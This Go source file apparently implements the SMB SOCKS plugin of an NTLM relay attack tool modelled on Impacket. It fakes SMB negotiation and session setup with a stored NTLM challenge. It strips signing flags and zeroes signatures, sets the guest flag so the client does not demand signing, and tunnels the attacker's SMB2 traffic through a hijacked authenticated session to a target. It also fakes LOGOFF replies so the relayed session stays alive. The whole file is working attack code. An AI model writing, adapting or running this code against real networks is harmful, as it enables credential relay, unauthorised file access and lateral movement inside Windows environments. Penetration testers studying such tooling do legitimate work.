package relay

import (
	"crypto/rand"
	"encoding/asn1"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"strings"

	"gopacket/internal/build"
)

// SMB2 flags used by the SOCKS plugin
const (
	SMB2_FLAGS_SIGNED = 0x00000008
)

// SMB2 session flags
const (
	SMB2_SESSION_FLAG_IS_GUEST = 0x0001
)

// SMBSocksPlugin implements the SOCKS plugin for SMB protocol.
// Fakes SMB negotiate + session setup with the SOCKS client using the stored
// NTLM challenge, then tunnels SMB2 traffic with MessageID rewriting and
// signature stripping. Matches Impacket's socksplugins/smb.py.
type SMBSocksPlugin struct{}

func (p *SMBSocksPlugin) InitConnection(clientConn net.Conn) error {
	return nil
}

func (p *SMBSocksPlugin) SkipAuthentication(clientConn net.Conn, sd *SessionData, lookupRelay func(string) *ActiveRelay) (string, error) {
	if sd == nil || len(sd.ChallengeMessage) == 0 {
		return "", fmt.Errorf("no NTLM challenge data available")
	}

	// Read first packet from SOCKS client
	pkt, err := recvPacket(clientConn)
	if err != nil {
		return "", fmt.Errorf("recv first packet: %v", err)
	}

	if len(pkt) < 4 {
		return "", fmt.Errorf("packet too short: %d bytes", len(pkt))
	}

	// Check if SMB1 (\xFF SMB) or SMB2 (\xFE SMB)
	if pkt[0] == 0xFF && pkt[1] == 'S' && pkt[2] == 'M' && pkt[3] == 'B' {
		// SMB1 negotiate — reply to force SMB2 upgrade
		if build.Debug {
			log.Printf("[D] SOCKS SMB: received SMB1 negotiate, sending upgrade response")
		}
		if err := p.sendSMB1NegotiateResponse(clientConn); err != nil {
			return "", fmt.Errorf("SMB1 negotiate response: %v", err)
		}

		// Client should now send SMB2 negotiate
		pkt, err = recvPacket(clientConn)
		if err != nil {
			return "", fmt.Errorf("recv SMB2 negotiate after upgrade: %v", err)
		}
	}

	// Parse SMB2 header
	if len(pkt) < 64 {
		return "", fmt.Errorf("packet too short for SMB2 header: %d", len(pkt))
	}
	if !(pkt[0] == 0xFE && pkt[1] == 'S' && pkt[2] == 'M' && pkt[3] == 'B') {
		return "", fmt.Errorf("expected SMB2 header, got %x", pkt[0:4])
	}

	hdr, err := parseSMB2Header(pkt)
	if err != nil {
		return "", fmt.Errorf("parse SMB2 header: %v", err)
	}

	// After SMB1→SMB2 upgrade, client may send NEGOTIATE or SESSION_SETUP directly
	if hdr.Command == SMB2_NEGOTIATE {
		// Build SMB2 NEGOTIATE response with SPNEGO NegTokenInit2
		serverGUID := [16]byte{}
		rand.Read(serverGUID[:])

		ntlmOid := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 2, 2, 10}
		spnegoBlob, err := encodeNegTokenInit2([]asn1.ObjectIdentifier{ntlmOid})
		if err != nil {
			return "", fmt.Errorf("encode SPNEGO: %v", err)
		}

		negResp := buildNegotiateResponse(hdr.MessageID, serverGUID, spnegoBlob)
		if err := sendPacket(clientConn, negResp); err != nil {
			return "", fmt.Errorf("send negotiate response: %v", err)
		}

		if build.Debug {
			log.Printf("[D] SOCKS SMB: sent negotiate response")
		}

		// Receive SESSION_SETUP #1 (Type 1 NTLM in SPNEGO)
		pkt, err = recvPacket(clientConn)
		if err != nil {
			return "", fmt.Errorf("recv session setup 1: %v", err)
		}

		hdr, err = parseSMB2Header(pkt)
		if err != nil {
			return "", fmt.Errorf("parse session setup 1 header: %v", err)
		}
	} else if hdr.Command != SMB2_SESSION_SETUP {
		return "", fmt.Errorf("expected NEGOTIATE or SESSION_SETUP, got 0x%04x", hdr.Command)
	}

	if hdr.Command != SMB2_SESSION_SETUP {
		return "", fmt.Errorf("expected SESSION_SETUP, got 0x%04x", hdr.Command)
	}

	secBuf, err := parseSessionSetupRequest(pkt)
	if err != nil {
		return "", fmt.Errorf("parse session setup 1: %v", err)
	}

	// Extract NTLM Type1 from SPNEGO
	_, err = extractNTLMFromSecBuf(secBuf)
	if err != nil {
		return "", fmt.Errorf("extract Type1: %v", err)
	}

	// Build response with stored Type2 challenge, wrapped in SPNEGO NegTokenResp
	// Strip NEGOTIATE_SIGN from the challenge flags (prevents SOCKS client from expecting signing)
	type2 := stripChallengeSigningFlags(sd.ChallengeMessage)

	ntlmsspOid := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 2, 2, 10}
	spnegoResp, err := encodeNegTokenResp(1, ntlmsspOid, type2) // 1 = accept-incomplete
	if err != nil {
		return "", fmt.Errorf("encode SPNEGO challenge: %v", err)
	}

	// SessionID is 0 until final auth succeeds (matches Impacket: SessionID=0 for challenge)
	sessionID := uint64(0)
	setupResp := buildSessionSetupResponse(hdr.MessageID, sessionID, STATUS_MORE_PROCESSING_REQUIRED, spnegoResp)
	if err := sendPacket(clientConn, setupResp); err != nil {
		return "", fmt.Errorf("send session setup 1 response: %v", err)
	}

	if build.Debug {
		log.Printf("[D] SOCKS SMB: sent Type2 challenge to client")
	}

	// Receive SESSION_SETUP #2 (Type 3 NTLM in SPNEGO)
	pkt, err = recvPacket(clientConn)
	if err != nil {
		return "", fmt.Errorf("recv session setup 2: %v", err)
	}

	hdr, err = parseSMB2Header(pkt)
	if err != nil {
		return "", fmt.Errorf("parse session setup 2 header: %v", err)
	}

	if hdr.Command != SMB2_SESSION_SETUP {
		return "", fmt.Errorf("expected SESSION_SETUP, got 0x%04x", hdr.Command)
	}

	secBuf, err = parseSessionSetupRequest(pkt)
	if err != nil {
		return "", fmt.Errorf("parse session setup 2: %v", err)
	}

	// Extract NTLM Type3 — may be SPNEGO NegTokenResp or raw NTLM
	type3, err := extractNTLMFromSecBuf(secBuf)
	if err != nil {
		return "", fmt.Errorf("extract Type3: %v", err)
	}

	// Extract username from Type3
	domain, user := extractNTLMType3Info(type3)
	username := fmt.Sprintf("%s\\%s", strings.ToUpper(domain), strings.ToUpper(user))

	if build.Debug {
		log.Printf("[D] SOCKS SMB: client authenticated as %s", username)
	}

	// Look up relay for this username
	relay := lookupRelay(username)
	if relay == nil {
		// Try with NetBIOS domain (first part before '.')
		if idx := strings.Index(domain, "."); idx > 0 {
			netbios := strings.ToUpper(domain[:idx])
			altUsername := fmt.Sprintf("%s\\%s", netbios, strings.ToUpper(user))
			relay = lookupRelay(altUsername)
			if relay != nil {
				username = altUsername
			}
		}
	}

	if relay == nil {
		// Send access denied
		denyResp := buildSessionSetupResponse(hdr.MessageID, sessionID, STATUS_LOGON_FAILURE, nil)
		sendPacket(clientConn, denyResp)
		return "", fmt.Errorf("no relay found for user %s", username)
	}

	// Get the real session ID from the relay client
	smbClient, ok := relay.Client.(*SMBRelayClient)
	if ok && smbClient != nil {
		sessionID = smbClient.sessionID
	}

	// Send SUCCESS response with SMB2_SESSION_FLAG_IS_GUEST set
	// Guest flag prevents smbclient from demanding message signing
	// Include SPNEGO NegTokenResp with NegState=accept-completed (matches Impacket)
	acceptBlob := encodeNegTokenRespAcceptCompleted()
	successResp := buildSessionSetupResponseWithFlags(hdr.MessageID, sessionID, STATUS_SUCCESS, acceptBlob, SMB2_SESSION_FLAG_IS_GUEST)
	if err := sendPacket(clientConn, successResp); err != nil {
		return "", fmt.Errorf("send auth success: %v", err)
	}

	log.Printf("[+] SOCKS SMB: authenticated %s — routing through relay", username)

	return username, nil
}

func (p *SMBSocksPlugin) TunnelConnection(clientConn net.Conn, relay *ActiveRelay) error {
	smbClient, ok := relay.Client.(*SMBRelayClient)
	if !ok || smbClient.conn == nil {
		return fmt.Errorf("SMB relay client has no underlying connection")
	}

	for {
		// Read packet from SOCKS client
		pkt, err := recvPacket(clientConn)
		if err != nil {
			return fmt.Errorf("recv from client: %v", err)
		}

		if len(pkt) < 64 {
			return fmt.Errorf("packet too short: %d", len(pkt))
		}

		hdr, err := parseSMB2Header(pkt)
		if err != nil {
			return fmt.Errorf("parse header: %v", err)
		}

		// Intercept LOGOFF — send fake success, don't forward (keep relay alive)
		if hdr.Command == SMB2_LOGOFF {
			if build.Debug {
				log.Printf("[D] SOCKS SMB: intercepting LOGOFF, sending fake success")
			}
			logoffResp := buildLogoffResponse(hdr.MessageID, hdr.SessionID)
			if err := sendPacket(clientConn, logoffResp); err != nil {
				return fmt.Errorf("send logoff response: %v", err)
			}
			return nil // End tunnel (client is done)
		}

		// Debug: log tunneled command
		if build.Debug {
			status := ""
			log.Printf("[D] SOCKS SMB tunnel: forwarding command=0x%04x msgID=%d%s (%d bytes)", hdr.Command, hdr.MessageID, status, len(pkt))
		}

		// Save client's original MessageID
		origMessageID := hdr.MessageID

		// Strip signing from the packet
		// Clear SMB2_FLAGS_SIGNED and zero the signature
		if len(pkt) >= 64 {
			flags := binary.LittleEndian.Uint32(pkt[16:20])
			flags &^= SMB2_FLAGS_SIGNED
			binary.LittleEndian.PutUint32(pkt[16:20], flags)
			// Zero signature bytes (offset 48-63)
			copy(pkt[48:64], make([]byte, 16))
		}

		// Rewrite MessageID to relay's counter
		relay.mu.Lock()
		newMessageID := smbClient.messageID
		smbClient.messageID++
		relay.mu.Unlock()

		binary.LittleEndian.PutUint64(pkt[24:32], newMessageID)

		// Also set the session ID to the relay's session ID
		binary.LittleEndian.PutUint64(pkt[40:48], smbClient.sessionID)

		// Forward to target
		if err := sendPacket(smbClient.conn, pkt); err != nil {
			return fmt.Errorf("send to target: %v", err)
		}

		// Read response from target
		resp, err := recvPacket(smbClient.conn)
		if err != nil {
			return fmt.Errorf("recv from target: %v", err)
		}

		// Handle STATUS_PENDING — wait for actual response
		if len(resp) >= 12 {
			status := binary.LittleEndian.Uint32(resp[8:12])
			if status == STATUS_PENDING {
				resp, err = recvPacket(smbClient.conn)
				if err != nil {
					return fmt.Errorf("recv from target (after pending): %v", err)
				}
			}
		}

		// Rewrite response MessageID back to client's original
		if len(resp) >= 32 {
			binary.LittleEndian.PutUint64(resp[24:32], origMessageID)
		}

		// Debug: log response
		if build.Debug && len(resp) >= 12 {
			respStatus := binary.LittleEndian.Uint32(resp[8:12])
			respCmd := uint16(0)
			if len(resp) >= 14 {
				respCmd = binary.LittleEndian.Uint16(resp[12:14])
			}
			log.Printf("[D] SOCKS SMB tunnel: response cmd=0x%04x status=0x%08x (%d bytes)", respCmd, respStatus, len(resp))
		}

		// Forward response to client
		if err := sendPacket(clientConn, resp); err != nil {
			return fmt.Errorf("send to client: %v", err)
		}

		relay.mu.Lock()
		relay.LastUsed = relay.LastUsed // touch to keep alive
		relay.mu.Unlock()
	}
}

// sendSMB1NegotiateResponse responds to an SMB1 negotiate with an SMB2
// negotiate response using DialectRevision=0x02FF (wildcard). This is the
// standard SMB1→SMB2 upgrade mechanism — the client sees 0xFE SMB and switches
// to SMB2. Matches Impacket's SMB SOCKS plugin behavior (getNegoAnswer when isSMB2=True).
func (p *SMBSocksPlugin) sendSMB1NegotiateResponse(conn net.Conn) error {
	serverGUID := [16]byte{}
	rand.Read(serverGUID[:])

	ntlmOid := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 2, 2, 10}
	spnegoBlob, err := encodeNegTokenInit2([]asn1.ObjectIdentifier{ntlmOid})
	if err != nil {
		return fmt.Errorf("encode SPNEGO for upgrade: %v", err)
	}

	// Build SMB2 negotiate response with wildcard dialect (0x02FF)
	// This tells the client to switch from SMB1 to SMB2
	negResp := buildNegotiateResponseWithDialect(0, serverGUID, spnegoBlob, SMB2_DIALECT_WILDCARD)
	return sendPacket(conn, negResp)
}

// buildSessionSetupResponseWithFlags builds an SMB2 SESSION_SETUP response with custom SessionFlags.
func buildSessionSetupResponseWithFlags(messageID uint64, sessionID uint64, status uint32, securityBuffer []byte, sessionFlags uint16) []byte {
	h := newSMB2Header(SMB2_SESSION_SETUP, SMB2_FLAGS_SERVER_TO_REDIR)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.Status = status
	h.CreditReqResp = 1

	// SESSION_SETUP response body (9 bytes + security buffer)
	sbLen := 0
	if securityBuffer != nil {
		sbLen = len(securityBuffer)
	}
	bodySize := 8 + sbLen
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 9) // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], sessionFlags) // SessionFlags
	secBufOffset := uint16(64 + 8) // Header(64) + body fixed part
	binary.LittleEndian.PutUint16(body[4:6], secBufOffset) // SecurityBufferOffset
	binary.LittleEndian.PutUint16(body[6:8], uint16(sbLen)) // SecurityBufferLength
	if sbLen > 0 {
		copy(body[8:], securityBuffer)
	}

	return append(marshalSMB2Header(&h), body...)
}

// buildLogoffResponse builds an SMB2 LOGOFF response.
func buildLogoffResponse(messageID uint64, sessionID uint64) []byte {
	h := newSMB2Header(SMB2_LOGOFF, SMB2_FLAGS_SERVER_TO_REDIR)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.Status = STATUS_SUCCESS
	h.CreditReqResp = 1

	// LOGOFF response body (4 bytes)
	body := make([]byte, 4)
	binary.LittleEndian.PutUint16(body[0:2], 4) // StructureSize

	return append(marshalSMB2Header(&h), body...)
}

// stripChallengeSigningFlags strips NEGOTIATE_SIGN from an NTLM Type2 challenge.
// This prevents the SOCKS client from expecting signed SMB packets.
// Matches Impacket: challengeMessage['flags'] &= ~(NTLMSSP_NEGOTIATE_SIGN)
func stripChallengeSigningFlags(type2 []byte) []byte {
	if len(type2) < 24 {
		return type2
	}
	msg := make([]byte, len(type2))
	copy(msg, type2)

	// Flags in Type2 are at offset 20 (4 bytes, little-endian)
	flags := binary.LittleEndian.Uint32(msg[20:24])
	flags &^= ntlmsspNegotiateSign
	binary.LittleEndian.PutUint32(msg[20:24], flags)
	return msg
}
